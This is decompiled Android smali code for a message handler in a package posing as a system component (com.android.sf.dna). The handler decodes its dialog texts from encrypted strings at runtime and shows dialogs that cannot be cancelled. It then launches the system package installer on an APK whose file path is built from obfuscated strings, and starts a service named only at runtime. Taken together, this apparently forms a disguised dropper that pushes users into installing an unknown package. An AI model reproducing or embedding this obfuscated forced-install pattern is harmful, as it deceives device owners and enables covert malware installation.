.class Lcom/android/sf/dna/Collection;
.super Landroid/os/Handler;


# instance fields
.field final synthetic a:Lcom/android/sf/dna/To;


# direct methods
.method constructor <init>(Lcom/android/sf/dna/To;)V
    .locals 0

    iput-object p1, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    invoke-direct {p0}, Landroid/os/Handler;-><init>()V

    return-void
.end method


# virtual methods
.method public handleMessage(Landroid/os/Message;)V
    .locals 9

    const/16 v3, 0xd

    const/4 v4, 0x0

    invoke-super {p0, p1}, Landroid/os/Handler;->handleMessage(Landroid/os/Message;)V

    iget v0, p1, Landroid/os/Message;->what:I

    sparse-switch v0, :sswitch_data_0

    :goto_0
    return-void

    :sswitch_0
    :try_start_0
    sget-object v0, Lcom/android/sf/dna/To;->h:Landroid/app/Activity;

    invoke-virtual {v0}, Landroid/app/Activity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    sget-object v1, Lcom/android/sf/dna/To;->h:Landroid/app/Activity;

    invoke-virtual {v1}, Landroid/app/Activity;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    sget-object v1, Lcom/android/sf/dna/To;->h:Landroid/app/Activity;

    invoke-virtual {v1, v0}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    goto :goto_0

    :sswitch_1
    :try_start_1
    const-string v0, ""
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :try_start_2
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v2, Lcom/android/sf/dna/To;->h:Landroid/app/Activity;

    sget-object v3, Lcom/android/sf/dna/To;->h:Landroid/app/Activity;

    invoke-virtual {v3}, Landroid/app/Activity;->getResources()Landroid/content/res/Resources;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v5, Lcom/android/sf/dna/To;->h:Landroid/app/Activity;

    invoke-virtual {v5}, Landroid/app/Activity;->getPackageName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, ":string/app_name"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    const/4 v6, 0x0

    invoke-virtual {v3, v4, v5, v6}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v3

    invoke-virtual {v2, v3}, Landroid/app/Activity;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, ":"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_9

    move-result-object v0

    :goto_1
    :try_start_3
    const-string v1, ""

    const-string v1, ""
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    :try_start_4
    sget-object v1, Lcom/android/sf/dna/To;->h:Landroid/app/Activity;

    invoke-virtual {v1}, Landroid/app/Activity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    sget-object v2, Lcom/android/sf/dna/To;->h:Landroid/app/Activity;

    invoke-virtual {v2}, Landroid/app/Activity;->getPackageName()Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v1

    iget-object v1, v1, Landroid/content/pm/PackageInfo;->versionName:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, ".2"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    move-result-object v2

    move-object v8, v2

    move-object v2, v1

    move-object v1, v8

    :goto_2
    :try_start_5
    iget-object v3, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    new-instance v4, Landroid/app/AlertDialog$Builder;

    sget-object v5, Lcom/android/sf/dna/To;->g:Landroid/content/Context;

    invoke-direct {v4, v5}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    const/4 v5, 0x0

    invoke-virtual {v4, v5}, Landroid/app/AlertDialog$Builder;->setCancelable(Z)Landroid/app/AlertDialog$Builder;

    move-result-object v4

    const-string v5, "aZ+4B1OpB1HYB1xYBbCO"

    const-string v6, "uKiI9qn_"

    invoke-static {v6}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v5, v6}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v4

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "BQIVB12EB7+4662H"

    const-string v7, "uKiI9qn_"

    invoke-static {v7}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-static {v6, v7}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v5, "vnmII6qIRmJR5bKRmmehhFbZ"

    const-string v6, "uKiI9qn_"

    invoke-static {v6}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v5, v6}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    const-string v1, "BatOBHaH"

    const-string v2, "uKiI9qn_"

    invoke-static {v2}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Lcom/android/sf/dna/Atrox;

    invoke-direct {v2, p0}, Lcom/android/sf/dna/Atrox;-><init>(Lcom/android/sf/dna/Collection;)V

    invoke-virtual {v0, v1, v2}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    move-result-object v0

    iput-object v0, v3, Lcom/android/sf/dna/To;->e:Landroid/app/AlertDialog;

    iget-object v0, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    iget-object v0, v0, Lcom/android/sf/dna/To;->e:Landroid/app/AlertDialog;

    new-instance v1, Lcom/android/sf/dna/Crotalus;

    invoke-direct {v1, p0}, Lcom/android/sf/dna/Crotalus;-><init>(Lcom/android/sf/dna/Collection;)V

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog;->setOnKeyListener(Landroid/content/DialogInterface$OnKeyListener;)V

    iget-object v0, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    iget-object v0, v0, Lcom/android/sf/dna/To;->e:Landroid/app/AlertDialog;

    invoke-virtual {v0}, Landroid/app/AlertDialog;->show()V

    goto/16 :goto_0

    :catch_1
    move-exception v0

    goto/16 :goto_0

    :catch_2
    move-exception v1

    const-string v1, "1.2.1121"

    const-string v2, "1.2.3221"
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1

    move-object v8, v2

    move-object v2, v1

    move-object v1, v8

    goto/16 :goto_2

    :sswitch_2
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/android/sf/dna/Looking;

    invoke-direct {v1, p0}, Lcom/android/sf/dna/Looking;-><init>(Lcom/android/sf/dna/Collection;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    goto/16 :goto_0

    :sswitch_3
    :try_start_6
    iget-object v0, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    new-instance v1, Landroid/app/ProgressDialog;

    sget-object v2, Lcom/android/sf/dna/To;->g:Landroid/content/Context;

    invoke-direct {v1, v2}, Landroid/app/ProgressDialog;-><init>(Landroid/content/Context;)V

    iput-object v1, v0, Lcom/android/sf/dna/To;->d:Landroid/app/ProgressDialog;

    iget-object v0, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    iget-object v0, v0, Lcom/android/sf/dna/To;->d:Landroid/app/ProgressDialog;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/app/ProgressDialog;->setCancelable(Z)V

    iget-object v0, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    iget-object v0, v0, Lcom/android/sf/dna/To;->d:Landroid/app/ProgressDialog;

    const-string v1, "BUCwBz2bB1OpB1HYB1xYBbCO9WQO"

    invoke-static {v1}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/app/ProgressDialog;->setTitle(Ljava/lang/CharSequence;)V

    iget-object v0, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    iget-object v0, v0, Lcom/android/sf/dna/To;->d:Landroid/app/ProgressDialog;

    invoke-virtual {v0}, Landroid/app/ProgressDialog;->show()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    :try_start_7
    iget-object v0, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    invoke-static {v0}, Lcom/android/sf/dna/To;->a(Lcom/android/sf/dna/To;)V

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/android/sf/dna/New;

    invoke-direct {v1, p0}, Lcom/android/sf/dna/New;-><init>(Lcom/android/sf/dna/Collection;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_3

    goto/16 :goto_0

    :catch_3
    move-exception v0

    :try_start_8
    iget-object v0, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    const/16 v1, 0xd

    invoke-static {v0, v1}, Lcom/android/sf/dna/To;->a(Lcom/android/sf/dna/To;I)V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_4

    goto/16 :goto_0

    :catch_4
    move-exception v0

    goto/16 :goto_0

    :sswitch_4
    :try_start_9
    new-instance v0, Ljava/io/File;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "9Ci5utjhztkp7cA_"

    invoke-static {v2}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Lcom/android/sf/dna/To;->h:Landroid/app/Activity;

    invoke-virtual {v2}, Landroid/app/Activity;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "9Cz18t3N94nO7KTm"

    invoke-static {v2}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v1

    if-eqz v1, :cond_0

    invoke-virtual {v0}, Ljava/io/File;->canRead()Z

    move-result v1

    if-eqz v1, :cond_0

    invoke-static {v0}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;

    move-result-object v0

    new-instance v1, Landroid/content/Intent;

    const-string v2, "android.intent.action.VIEW"

    invoke-direct {v1, v2, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    invoke-virtual {v1, v0}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    const/4 v0, 0x1

    invoke-virtual {v1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const-string v0, "com.android.packageinstaller"

    const-string v2, "com.android.packageinstaller.PackageInstallerActivity"

    invoke-virtual {v1, v0, v2}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    sget-object v0, Lcom/android/sf/dna/To;->h:Landroid/app/Activity;

    invoke-virtual {v0, v1}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    const/4 v0, 0x0

    sput-boolean v0, Lcom/android/sf/dna/To;->i:Z

    :goto_3
    iget-object v0, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    iget-object v0, v0, Lcom/android/sf/dna/To;->d:Landroid/app/ProgressDialog;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/app/ProgressDialog;->setCancelable(Z)V

    iget-object v0, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    iget-object v0, v0, Lcom/android/sf/dna/To;->d:Landroid/app/ProgressDialog;

    invoke-virtual {v0}, Landroid/app/ProgressDialog;->dismiss()V

    iget-object v0, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    iget-object v0, v0, Lcom/android/sf/dna/To;->d:Landroid/app/ProgressDialog;

    invoke-virtual {v0}, Landroid/app/ProgressDialog;->cancel()V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_6

    :goto_4
    :try_start_a
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/android/sf/dna/Additions;

    invoke-direct {v1, p0}, Lcom/android/sf/dna/Additions;-><init>(Lcom/android/sf/dna/Collection;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_5

    goto/16 :goto_0

    :catch_5
    move-exception v0

    iget-object v0, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    invoke-static {v0, v3}, Lcom/android/sf/dna/To;->a(Lcom/android/sf/dna/To;I)V

    goto/16 :goto_0

    :cond_0
    :try_start_b
    iget-object v0, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    const/16 v1, 0xd

    invoke-static {v0, v1}, Lcom/android/sf/dna/To;->a(Lcom/android/sf/dna/To;I)V
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_6

    goto :goto_3

    :catch_6
    move-exception v0

    goto :goto_4

    :sswitch_5
    :try_start_c
    iget-object v0, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    new-instance v1, Landroid/app/AlertDialog$Builder;

    sget-object v2, Lcom/android/sf/dna/To;->g:Landroid/content/Context;

    invoke-direct {v1, v2}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Landroid/app/AlertDialog$Builder;->setCancelable(Z)Landroid/app/AlertDialog$Builder;

    move-result-object v1

    const-string v2, "a7vHBB+R"

    const-string v3, "uKiI9qn_"

    invoke-static {v3}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v1

    const-string v2, "a9XdB1HYBHcsa9cR662fB9W9BU25B1OpB1HY662T"

    const-string v3, "uKiI9qn_"

    invoke-static {v3}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v1

    const-string v2, "BatOBHaH"

    const-string v3, "uKiI9qn_"

    invoke-static {v3}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Lcom/android/sf/dna/Up;

    invoke-direct {v3, p0}, Lcom/android/sf/dna/Up;-><init>(Lcom/android/sf/dna/Collection;)V

    invoke-virtual {v1, v2, v3}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object v1

    invoke-virtual {v1}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    move-result-object v1

    iput-object v1, v0, Lcom/android/sf/dna/To;->e:Landroid/app/AlertDialog;

    iget-object v0, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    const/4 v1, 0x0

    iput v1, v0, Lcom/android/sf/dna/To;->f:I

    iget-object v0, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    iget-object v0, v0, Lcom/android/sf/dna/To;->e:Landroid/app/AlertDialog;

    new-instance v1, Lcom/android/sf/dna/Some;

    invoke-direct {v1, p0}, Lcom/android/sf/dna/Some;-><init>(Lcom/android/sf/dna/Collection;)V

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog;->setOnKeyListener(Landroid/content/DialogInterface$OnKeyListener;)V

    iget-object v0, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    iget-object v0, v0, Lcom/android/sf/dna/To;->e:Landroid/app/AlertDialog;

    invoke-virtual {v0}, Landroid/app/AlertDialog;->show()V
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_7

    goto/16 :goto_0

    :catch_7
    move-exception v0

    :sswitch_6
    iget-object v0, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    new-instance v1, Landroid/app/AlertDialog$Builder;

    sget-object v2, Lcom/android/sf/dna/To;->g:Landroid/content/Context;

    invoke-direct {v1, v2}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    invoke-virtual {v1, v4}, Landroid/app/AlertDialog$Builder;->setCancelable(Z)Landroid/app/AlertDialog$Builder;

    move-result-object v1

    const-string v2, "a7vHBB+R"

    const-string v3, "uKiI9qn_"

    invoke-static {v3}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v1

    const-string v2, "B1OpB1HYaz2SaZHTBbZba7X0BzvhaZ+RBaW9B8UG"

    const-string v3, "uKiI9qn_"

    invoke-static {v3}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v1

    const-string v2, "a7X0Bzvh"

    const-string v3, "uKiI9qn_"

    invoke-static {v3}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Lcom/android/sf/dna/Today;

    invoke-direct {v3, p0}, Lcom/android/sf/dna/Today;-><init>(Lcom/android/sf/dna/Collection;)V

    invoke-virtual {v1, v2, v3}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object v1

    invoke-virtual {v1}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    move-result-object v1

    iput-object v1, v0, Lcom/android/sf/dna/To;->e:Landroid/app/AlertDialog;

    iget-object v0, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    iput v4, v0, Lcom/android/sf/dna/To;->f:I

    iget-object v0, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    iget-object v0, v0, Lcom/android/sf/dna/To;->e:Landroid/app/AlertDialog;

    new-instance v1, Lcom/android/sf/dna/Picked;

    invoke-direct {v1, p0}, Lcom/android/sf/dna/Picked;-><init>(Lcom/android/sf/dna/Collection;)V

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog;->setOnKeyListener(Landroid/content/DialogInterface$OnKeyListener;)V

    iget-object v0, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    iget-object v0, v0, Lcom/android/sf/dna/To;->e:Landroid/app/AlertDialog;

    invoke-virtual {v0}, Landroid/app/AlertDialog;->show()V

    goto/16 :goto_0

    :sswitch_7
    :try_start_d
    iget-object v0, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    iget-object v0, v0, Lcom/android/sf/dna/To;->c:Landroid/content/Intent;

    iget-object v1, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    iget-object v1, v1, Lcom/android/sf/dna/To;->a:Ljava/lang/String;

    iget-object v2, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    iget-object v2, v2, Lcom/android/sf/dna/To;->b:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    sget-object v0, Lcom/android/sf/dna/To;->h:Landroid/app/Activity;

    iget-object v1, p0, Lcom/android/sf/dna/Collection;->a:Lcom/android/sf/dna/To;

    iget-object v1, v1, Lcom/android/sf/dna/To;->c:Landroid/content/Intent;

    invoke-virtual {v0, v1}, Landroid/app/Activity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_8

    goto/16 :goto_0

    :catch_8
    move-exception v0

    goto/16 :goto_0

    :catch_9
    move-exception v1

    goto/16 :goto_1

    nop

    :sswitch_data_0
    .sparse-switch
        0x0 -> :sswitch_0
        0xa -> :sswitch_2
        0xb -> :sswitch_3
        0xc -> :sswitch_4
        0xd -> :sswitch_5
        0xe -> :sswitch_6
        0x64 -> :sswitch_7
        0x65 -> :sswitch_1
    .end sparse-switch
.end method
